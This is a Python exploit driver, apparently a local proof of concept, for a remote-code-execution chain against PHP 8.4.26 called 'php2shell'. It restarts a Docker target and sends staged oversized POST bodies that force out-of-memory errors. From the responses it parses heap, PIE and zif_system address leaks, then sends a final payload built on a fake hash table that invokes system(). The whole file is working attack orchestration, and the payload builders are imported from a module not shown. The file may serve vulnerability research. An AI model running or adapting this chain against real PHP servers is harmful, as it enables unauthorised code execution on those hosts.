#!/usr/bin/env python3

from __future__ import annotations

import argparse
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
import subprocess

import exploit_primitives as exploit
from lab_runtime import DockerTarget, HttpResponse, LocalHttpClient, PostOptions

EXPECTED_SIZES = {"seed": 305042, "A1": 1045243, "B1": 339678, "A2": 279369}
OOM_MARKER = b"Allowed memory size"
PROOF_MARKER = "LOCAL_PHP2SHELL_RCE_PROOF"

class ProofError(RuntimeError):
    pass

@dataclass(frozen=True, slots=True)
class ProofConfig:
    container: str
    port: int
    attempts: int
    proof_log: Path

@dataclass(frozen=True, slots=True)
class PayloadSet:
    seed: bytes
    a1: bytes
    b1: bytes
    a2: bytes

    @classmethod
    def create(cls) -> PayloadSet:
        seed_specification = exploit.CheapBodySpec(880, 64, 0, b"a", b"k0", 32768, 1)
        a2_specification = exploit.CheapBodySpec(880, 64, 115, b"a" * 32, b"k0")
        payloads = (
            exploit.build_cheap_body(seed_specification),
            exploit.build_a1(),
            exploit.build_b1(),
            exploit.build_cheap_body(a2_specification),
        )
        return cls(*payloads)

    def items(self) -> tuple[tuple[str, bytes], ...]:
        return (("seed", self.seed), ("A1", self.a1), ("B1", self.b1), ("A2", self.a2))

    def validate(self) -> None:
        for name, body in self.items():
            if len(body) != EXPECTED_SIZES[name]:
                raise ProofError(f"{name} size mismatch: {len(body)} != {EXPECTED_SIZES[name]}")
            ensure_request_size(name, body)

    def size_line(self) -> str:
        return "sizes " + " ".join(f"{name}={len(body)}" for name, body in self.items())

@dataclass(frozen=True, slots=True)
class LeakAttempt:
    number: int
    leak: exploit.AddressLeak
    seed_response: HttpResponse
    a1_response: HttpResponse
    b1_response: HttpResponse

    def summary(self) -> str:
        sizes = f"seed={len(self.seed_response.raw)} A1={len(self.a1_response.raw)} B1={len(self.b1_response.raw)}"
        addresses = f"main={self.leak.main_chunk:#x} php={self.leak.php_base:#x} zif_system={self.leak.zif_system:#x}"
        return f"attempt={self.number} {sizes} {addresses}"

class ProofRunner:
    def __init__(self, config: ProofConfig):
        self.config = config
        self.target = DockerTarget(config.container)
        self.client = LocalHttpClient(config.port)
        self.payloads = PayloadSet.create()
        self.transcript: list[str] = []

    def run(self) -> None:
        self.config.proof_log.unlink(missing_ok=True)
        self.payloads.validate()
        self.start_transcript()
        attempt = self.obtain_leak()
        self.execute(attempt.leak)
        self.complete()

    def start_transcript(self) -> None:
        self.transcript = [
            "LOCAL-ONLY php2shell proof",
            "utc=" + datetime.now(timezone.utc).isoformat(),
            "container_id|image_id=" + self.target.identity(),
            f"target=http://127.0.0.1:{self.config.port} PHP=8.4.26",
            self.payloads.size_line(),
        ]
        print(self.transcript[-1], flush=True)

    def obtain_leak(self) -> LeakAttempt:
        for number in range(1, self.config.attempts + 1):
            try:
                attempt = self.run_leak_attempt(number)
            except (OSError, RuntimeError, subprocess.SubprocessError) as error:
                print(f"attempt={number} failed: {error}", flush=True)
                continue
            line = attempt.summary()
            print(line, flush=True)
            self.transcript.append(line)
            return attempt
        raise ProofError("could not obtain a stable heap/PIE leak")

    def run_leak_attempt(self, number: int) -> LeakAttempt:
        self.target.restart()
        seed_response = self.client.post(self.payloads.seed, PostOptions(timeout=25))
        require_oom("seed", seed_response)
        self.client.wait_until_ready()
        query = "&".join(f"q{index:04d}=v" for index in range(8))
        a1_options = PostOptions("/ping.php?" + query, b"C", 25)
        b1_options = PostOptions("/ping.php?" + exploit.b1_query(), timeout=10)
        a1_response = self.client.post(self.payloads.a1, a1_options)
        b1_response = self.client.post(self.payloads.b1, b1_options)
        leak = exploit.parse_leak(b1_response.raw)
        require_oom("B1", b1_response)
        if not self.client.probe():
            raise ProofError("worker did not survive B1")
        return LeakAttempt(number, leak, seed_response, a1_response, b1_response)

    def execute(self, leak: exploit.AddressLeak) -> None:
        a2_response = self.client.post(self.payloads.a2, PostOptions(timeout=25))
        require_oom("A2", a2_response)
        b2 = exploit.build_b2(leak.fake_hash_table, leak.zif_system)
        ensure_request_size("B2", b2)
        response = self.client.post(b2, PostOptions(timeout=15))
        proof = response.body.decode("utf-8", "replace").strip()
        line = f"B2={len(b2)} S={leak.fake_hash_table:#x} status={response.status!r}"
        print(line, flush=True)
        print(f"response={proof!r}", flush=True)
        self.transcript.extend((line, f"response={proof!r}"))
        if not response.status.endswith("200 OK") or PROOF_MARKER not in proof:
            raise ProofError("B2 did not return the local print-flag proof")

    def complete(self) -> None:
        self.transcript.append("RESULT=LOCAL_RCE_CONFIRMED")
        self.config.proof_log.write_text("\n".join(self.transcript) + "\n", encoding="utf-8")
        print("RESULT=LOCAL_RCE_CONFIRMED", flush=True)
        print(f"proof_log={self.config.proof_log}", flush=True)

def require_oom(stage: str, response: HttpResponse) -> None:
    if OOM_MARKER not in response.raw:
        raise ProofError(f"{stage} OOM was not observed ({response.status!r}, {len(response.raw)} bytes)")

def ensure_request_size(stage: str, body: bytes) -> None:
    if len(body) >= exploit.MAX_REQUEST_BODY:
        raise ProofError(f"{stage} exceeds the 1 MiB request-body cap: {len(body)}")

def parse_config() -> ProofConfig:
    parser = argparse.ArgumentParser()
    parser.add_argument("--container", default="php2shell-local-proof")
    parser.add_argument("--port", type=int, default=18082)
    parser.add_argument("--attempts", type=int, default=8)
    parser.add_argument("--proof-log", type=Path, default=Path(__file__).resolve().with_name("proof.log"))
    arguments = parser.parse_args()
    return ProofConfig(arguments.container, arguments.port, arguments.attempts, arguments.proof_log)

def main() -> int:
    try:
        ProofRunner(parse_config()).run()
    except (OSError, ProofError, subprocess.SubprocessError) as error:
        raise SystemExit(str(error)) from None
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
